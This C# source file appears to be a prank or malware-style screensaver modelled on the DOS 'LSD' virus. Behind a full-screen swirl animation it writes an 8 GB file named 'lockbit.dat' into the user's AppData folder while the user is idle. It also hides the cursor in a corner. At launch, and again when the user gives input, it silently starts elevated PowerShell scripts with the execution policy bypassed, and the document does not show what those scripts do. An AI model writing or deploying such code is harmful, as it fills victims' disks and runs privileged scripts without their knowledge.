using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

class LsdSwirl : Form
{
    private readonly byte[] palette = new byte[] {
        0x3f,0x00,0x3f, 0x3f,0x02,0x3d, 0x3f,0x04,0x3b, 0x3f,0x06,0x39,
        0x3f,0x08,0x37, 0x3f,0x0a,0x35, 0x3f,0x0c,0x33, 0x3f,0x0e,0x31,
        0x3f,0x10,0x2f, 0x3f,0x12,0x2d, 0x3f,0x14,0x2b, 0x3f,0x16,0x29,
        0x3f,0x18,0x27, 0x3f,0x1a,0x25, 0x3f,0x1c,0x23, 0x3f,0x1e,0x21,
        0x3f,0x20,0x1f, 0x3f,0x22,0x1d, 0x3f,0x24,0x1b, 0x3f,0x26,0x19,
        0x3f,0x28,0x17, 0x3f,0x2a,0x15, 0x3f,0x2c,0x13, 0x3f,0x2e,0x11,
        0x3f,0x30,0x0f, 0x3f,0x32,0x0d, 0x3f,0x34,0x0b, 0x3f,0x36,0x09,
        0x3f,0x38,0x07, 0x3f,0x3a,0x05, 0x3f,0x3c,0x03, 0x3f,0x3e,0x01,
        0x3f,0x3f,0x00, 0x3d,0x3f,0x02, 0x3b,0x3f,0x04, 0x39,0x3f,0x06,
        0x37,0x3f,0x08, 0x35,0x3f,0x0a, 0x33,0x3f,0x0c, 0x31,0x3f,0x0e,
        0x2f,0x3f,0x10, 0x2d,0x3f,0x12, 0x2b,0x3f,0x14, 0x29,0x3f,0x16,
        0x27,0x3f,0x18, 0x25,0x3f,0x1a, 0x23,0x3f,0x1c, 0x21,0x3f,0x1e,
        0x1f,0x3f,0x20, 0x1d,0x3f,0x22, 0x1b,0x3f,0x24, 0x19,0x3f,0x26,
        0x17,0x3f,0x28, 0x15,0x3f,0x2a, 0x13,0x3f,0x2c, 0x11,0x3f,0x2e,
        0x0f,0x3f,0x30, 0x0d,0x3f,0x32, 0x0b,0x3f,0x34, 0x09,0x3f,0x36,
        0x07,0x3f,0x38, 0x05,0x3f,0x3a, 0x03,0x3f,0x3c, 0x01,0x3f,0x3e,
        0x00,0x3f,0x3f, 0x00,0x3d,0x3f, 0x00,0x3b,0x3f, 0x00,0x39,0x3f,
        0x00,0x37,0x3f, 0x00,0x35,0x3f, 0x00,0x33,0x3f, 0x00,0x31,0x3f,
        0x00,0x2f,0x3f, 0x00,0x2d,0x3f, 0x00,0x2b,0x3f, 0x00,0x29,0x3f,
        0x00,0x27,0x3f, 0x00,0x25,0x3f, 0x00,0x23,0x3f, 0x00,0x21,0x3f,
        0x00,0x1f,0x3f, 0x00,0x1d,0x3f, 0x00,0x1b,0x3f, 0x00,0x19,0x3f,
        0x00,0x17,0x3f, 0x00,0x15,0x3f, 0x00,0x13,0x3f, 0x00,0x11,0x3f,
        0x00,0x0f,0x3f, 0x00,0x0d,0x3f, 0x00,0x0b,0x3f, 0x00,0x09,0x3f,
        0x00,0x07,0x3f, 0x00,0x05,0x3f, 0x00,0x03,0x3f, 0x00,0x01,0x3f,
        0x00,0x00,0x3f, 0x02,0x00,0x3f, 0x04,0x00,0x3f, 0x06,0x00,0x3f,
        0x08,0x00,0x3f, 0x0a,0x00,0x3f, 0x0c,0x00,0x3f, 0x0e,0x00,0x3f,
        0x10,0x00,0x3f, 0x12,0x00,0x3f, 0x14,0x00,0x3f, 0x16,0x00,0x3f,
        0x18,0x00,0x3f, 0x1a,0x00,0x3f, 0x1c,0x00,0x3f, 0x1e,0x00,0x3f,
        0x20,0x00,0x3f, 0x22,0x00,0x3f, 0x24,0x00,0x3f, 0x26,0x00,0x3f,
        0x28,0x00,0x3f, 0x2a,0x00,0x3f, 0x2c,0x00,0x3f, 0x2e,0x00,0x3f,
        0x30,0x00,0x3f, 0x32,0x00,0x3f, 0x34,0x00,0x3f, 0x36,0x00,0x3f,
        0x38,0x00,0x3f, 0x3a,0x00,0x3f, 0x3c,0x00,0x3f, 0x3f,0x00,0x3f
    };
    private readonly byte[] lookupTable = new byte[] {
        0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,
        0x3f,0x3f,0x3f,0x3f,0x3f,0x3e,0x3e,0x3e,
        0x3e,0x3d,0x3d,0x3d,0x3c,0x3c,0x3b,0x3b,
        0x3a,0x3a,0x39,0x39,0x38,0x38,0x37,0x37,
        0x36,0x35,0x35,0x34,0x34,0x33,0x32,0x32,
        0x31,0x30,0x30,0x2f,0x2e,0x2e,0x2d,0x2c,
        0x2c,0x2b,0x2a,0x29,0x29,0x28,0x27,0x26,
        0x25,0x25,0x24,0x23,0x22,0x22,0x21,0x20,
        0x1f,0x1e,0x1e,0x1d,0x1c,0x1b,0x1b,0x1a,
        0x19,0x18,0x17,0x17,0x16,0x15,0x14,0x14,
        0x13,0x12,0x12,0x11,0x10,0x10,0x0f,0x0e,
        0x0e,0x0d,0x0c,0x0c,0x0b,0x0b,0x0a,0x09,
        0x09,0x08,0x08,0x07,0x07,0x06,0x06,0x05,
        0x05,0x05,0x04,0x04,0x03,0x03,0x03,0x02,
        0x02,0x02,0x02,0x01,0x01,0x01,0x01,0x01,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };
    private readonly Color[] colors = new Color[128];
    private readonly byte[,] colorBytes = new byte[128, 3];
    private byte var68a = 0, var68b = 0, var68c = 0, var68d = 0;
    private byte[] vars505 = new byte[] { 2, 1, 3, 4 };
    private ushort bpVar = 0;
    private readonly Timer timer;
    private Bitmap canvas = new Bitmap(320, 200, PixelFormat.Format24bppRgb);
    private int canvasWidth = 320, canvasHeight = 200;
    private Point lastMousePosition;
    private byte[] vars = new byte[320 * 200];
    private FileStream fileStream;
    private readonly long totalBytes = 8L * 1024 * 1024 * 1024; // 8GB
    private long bytesWritten = 0;
    private bool inputDetected = false;
    private bool writingChunk = false;
    private readonly int chunkSize = 4096; // 4KB chunks for sector alignment

    public LsdSwirl()
    {
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.BackColor = Color.Black;
        this.DoubleBuffered = true;

        Rectangle screen = Screen.PrimaryScreen.Bounds;
        int screenWidth = screen.Width, screenHeight = screen.Height;
        Cursor.Position = new Point(screenWidth - 1, screenHeight - 1);
        lastMousePosition = Cursor.Position;

        float aspectRatio = (float)canvasWidth / canvasHeight;
        float screenAspectRatio = (float)screenWidth / screenHeight;
        if (screenAspectRatio > aspectRatio)
        {
            canvasHeight = screenHeight;
            canvasWidth = (int)(screenHeight * aspectRatio);
        }
        else
        {
            canvasWidth = screenWidth;
            canvasHeight = (int)(screenWidth / aspectRatio);
        }

        canvas = new Bitmap(320, 200, PixelFormat.Format24bppRgb);

        for (int i = 0; i < 128; i++)
        {
            int r = palette[i * 3 + 0] * 255 / 63;
            int g = palette[i * 3 + 1] * 255 / 63;
            int b = palette[i * 3 + 2] * 255 / 63;
            colors[i] = Color.FromArgb(r, g, b);
            colorBytes[i, 0] = (byte)b;
            colorBytes[i, 1] = (byte)g;
            colorBytes[i, 2] = (byte)r;
        }

        try
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string filePath = Path.Combine(appDataPath, "lockbit.dat");
            fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None);
            fileStream.SetLength(totalBytes);
        }
        catch (Exception ex)
        {
            MessageBox.Show(String.Format("Failed to create 8GB file: {0}", ex.Message));
            Application.Exit();
            return;
        }

        timer = new Timer();
        timer.Interval = 33;
        timer.Tick += new EventHandler(UpdateFrame);
        timer.Start();

        this.MouseMove += new MouseEventHandler(MouseMoveHandler);
        this.MouseClick += new MouseEventHandler(MouseClickHandler);
        this.KeyDown += new KeyEventHandler(KeyDownHandler);
    }

    private void MouseMoveHandler(object sender, MouseEventArgs e)
    {
        Point current = Cursor.Position;
        if (Math.Abs(current.X - lastMousePosition.X) > 5 || Math.Abs(current.Y - lastMousePosition.Y) > 5)
        {
            inputDetected = true;
        }
        lastMousePosition = current;
    }

    private void MouseClickHandler(object sender, MouseEventArgs e)
    {
        inputDetected = true;
    }

    private void KeyDownHandler(object sender, KeyEventArgs e)
    {
        inputDetected = true;
    }

    protected override void OnPaint(PaintEventArgs e)
    {
        Rectangle screen = Screen.PrimaryScreen.Bounds;
        int xOffset = (screen.Width - canvasWidth) / 2;
        int yOffset = (screen.Height - canvasHeight) / 2;

        e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
        e.Graphics.DrawImage(canvas, xOffset, yOffset, canvasWidth, canvasHeight);

        float percentage = (float)bytesWritten / totalBytes * 100;
        string text = String.Format("Progress: {0:F2}% ({1:N0} bytes)", percentage, bytesWritten);
        using (Font font = new Font("Arial", 12))
        using (SolidBrush brush = new SolidBrush(Color.Black))
        {
            e.Graphics.DrawString(text, font, brush, xOffset, yOffset);
        }

        base.OnPaint(e);
    }

    private void UpdateFrame(object sender, EventArgs e)
    {
        if (!inputDetected && bytesWritten < totalBytes)
        {
            writingChunk = true;
            long bytesToWrite = Math.Min(chunkSize, totalBytes - bytesWritten);
            byte[] buffer = new byte[chunkSize];
            for (int i = 0; i < chunkSize; i++)
                buffer[i] = palette[i % palette.Length];
            try
            {
                fileStream.Write(buffer, 0, (int)bytesToWrite);
                bytesWritten += bytesToWrite;
            }
            catch (Exception ex)
            {
                MessageBox.Show(String.Format("Write error: {0}", ex.Message));
                inputDetected = true;
            }
            writingChunk = false;
        }

        BitmapData bmpData = canvas.LockBits(
            new Rectangle(0, 0, canvas.Width, canvas.Height),
            ImageLockMode.WriteOnly,
            PixelFormat.Format24bppRgb);

        unsafe
        {
            byte* ptr = (byte*)bmpData.Scan0;
            int stride = bmpData.Stride;
            for (int y = 0; y < 200; y++)
            {
                byte* row = ptr + y * stride;
                for (int x = 0; x < 320; x++)
                {
                    byte al = (byte)(bpVar & 0xFF);
                    al += lookupTable[y % lookupTable.Length];
                    al += lookupTable[x % lookupTable.Length];
                    al += lookupTable[(y + 2) % lookupTable.Length];
                    al += lookupTable[(x + 1) % lookupTable.Length];
                    al |= 0x80;
                    byte colorIndex = (byte)(al - 128);
                    vars[y * 320 + x] = colorIndex;
                    int offset = x * 3;
                    row[offset + 0] = colorBytes[colorIndex, 0];
                    row[offset + 1] = colorBytes[colorIndex, 1];
                    row[offset + 2] = colorBytes[colorIndex, 2];
                    var68a = (byte)(var68a + 0.5f);
                    var68b = (byte)(var68b + 1);
                }
                var68c = (byte)(var68c + 1);
                var68d = (byte)(var68d + 0.5f);
            }
        }

        canvas.UnlockBits(bmpData);

        bpVar--;
        byte bl = (byte)(bpVar & 0xFF);
        bl ^= (byte)((bpVar >> 8) & 0xFF);
        byte pixel = vars[199 * 320 + 319];
        bl ^= pixel;
        bl ^= var68c;
        bl ^= var68a;
        bl = (byte)(bl + var68d);
        bl = (byte)(bl + var68b);
        if ((bl & 0x08) == 0)
        {
            int di = bl & 0x03;
            if (vars505[di] < 0xFD)
                vars505[di]++;
        }
        else
        {
            int di = bl & 0x03;
            if (vars505[di] > 0x03)
                vars505[di]--;
        }
        var68a = (byte)(var68a + vars505[0] * 0.5f);
        var68b = (byte)(var68b - vars505[1] * 0.5f);
        var68c = (byte)(var68c + vars505[2] * 0.5f);
        var68d = (byte)(var68d - vars505[3] * 0.5f);

        Rectangle screen = Screen.PrimaryScreen.Bounds;
        int xOffset = (screen.Width - canvasWidth) / 2;
        int yOffset = (screen.Height - canvasHeight) / 2;
        Invalidate(new Rectangle(xOffset, yOffset, canvasWidth, canvasHeight));

        if (inputDetected && !writingChunk)
        {
            fileStream.Close();
            Application.Exit();
			    string scriptPath = @"C:\Users\DEV1\Videos\Virus.DOS.LSD\grok creations\netsaver\unblock.ps1";
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = String.Format("-NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"{0}\\\"' -Verb RunAs -Wait\"", scriptPath),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    MessageBox.Show(String.Format("PowerShell script failed balls: {0}", error));
                    return;
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(String.Format("Failed to run PowerShell script: {0}", ex.Message));
            return;
        }
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing)
        {
            if (fileStream != null) fileStream.Dispose();
            if (canvas != null) canvas.Dispose();
            if (timer != null) timer.Dispose();
        }
        base.Dispose(disposing);
    }

    [STAThread]
    static void Main()
    {
        string scriptPath = @"C:\Users\DEV1\Videos\Virus.DOS.LSD\grok creations\netsaver\systemcleanupNET5000.ps1";
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = String.Format("-NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"{0}\\\"' -Verb RunAs -Wait\"", scriptPath),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    MessageBox.Show(String.Format("PowerShell script failed: {0}", error));
                    return;
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(String.Format("Failed to run PowerShell script: {0}", ex.Message));
            return;
        }

        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new LsdSwirl());
    }
}